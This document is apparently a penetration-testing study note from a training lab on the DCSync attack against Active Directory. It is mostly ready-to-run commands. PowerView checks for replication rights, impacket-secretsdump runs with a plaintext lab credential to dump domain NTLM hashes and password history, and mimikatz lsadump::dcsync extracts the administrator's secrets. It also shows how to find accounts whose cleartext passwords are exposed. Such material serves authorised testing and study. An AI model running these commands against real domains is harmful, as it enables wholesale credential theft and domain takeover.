To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.
#### Confirm permissions
Get user `objectsid`
```powershell
Import-module .\PowerView.ps1
Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```
Check replication rights
```powershell
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
#### Secretsdump
We can use the `-just-dc-ntlm` flag if we only want NTLM hashes or specify `-just-dc-user <USERNAME>` to only extract data for a specific user. Other useful options include `-pwd-last-set` to see when each account's password was last changed and `-history` if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The `-user-status` is another helpful flag to check and see if a user is disabled.

```bash
impacket-secretsdump -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn:'Pwn3d123!'@172.16.5.5 
```

Cleartext passwords can be found in this dump. This is due to reversible encryption set on accounts. We can check with Powerview
```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```
#### Mimikatz
Open new powershell session using `runas`
```powershell
runas /netonly /user:INLANEFREIGHT\adunn powershell
```
DCSync with mimikatz
```powershell
privilege::debug
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```
